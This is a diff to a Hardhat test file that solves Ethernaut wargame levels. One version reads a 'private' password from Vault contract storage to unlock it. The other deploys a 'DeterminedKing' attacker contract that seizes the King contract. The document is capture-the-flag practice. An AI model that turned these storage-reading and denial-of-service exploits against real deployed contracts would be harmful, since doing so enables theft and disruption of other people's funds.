@@ -1,10 +1,10 @@
-import { Force__factory, ForcePushEth__factory, Vault__factory } from "typechain-types"
+import { DeterminedKing__factory, King__factory } from "typechain-types"
 import * as hardhat from "hardhat"
 import { ethers } from "hardhat"
 import path from "path"
 import os from "os"
 import * as dotenv from "dotenv"
-import { BigNumber, BytesLike, Wallet } from "ethers"
+import { BytesLike, Wallet } from "ethers"
 
 const { expect } = require("chai")
 
@@ -32,13 +32,14 @@ describe("ethernaut", function() {
 
     const mySigner = new Wallet(settings["privatekey"], hardhat.ethers.provider)
 
-    let signatureString = hardhat.ethers.utils.formatBytes32String("0xaabb")
-    const signature = hardhat.ethers.utils.arrayify(signatureString)
-    // const vaultContract = await new Vault__factory(mySigner).deploy(signature)
-    const vaultContract = Vault__factory.connect(settings["instanceAddr"], mySigner)
-    const badlyHiddenSignature = await hardhat.ethers.provider.getStorageAt(vaultContract.address, 1)
-    await vaultContract.unlock(badlyHiddenSignature).then(x => x.wait())
+    // const kingContract = await new King__factory(initialDeployer).deploy()
+    const kingContract = King__factory.connect(settings["instanceAddr"], mySigner)
+    const determinedKingContract = await new DeterminedKing__factory(mySigner).deploy(kingContract.address, { value: 1 })
+    await determinedKingContract.deployed()
+    const king = await kingContract._king()
 
-    expect(badlyHiddenSignature.toString()).to.eql(signatureString)
+    expect(king).to.eql(determinedKingContract.address)
+    // await initialDeployer.sendTransaction({ to: kingContract.address, value: 1 }).then(x => x.wait())
+    // expect(await kingContract._king()).to.eql(initialDeployer.address)
   })
 })
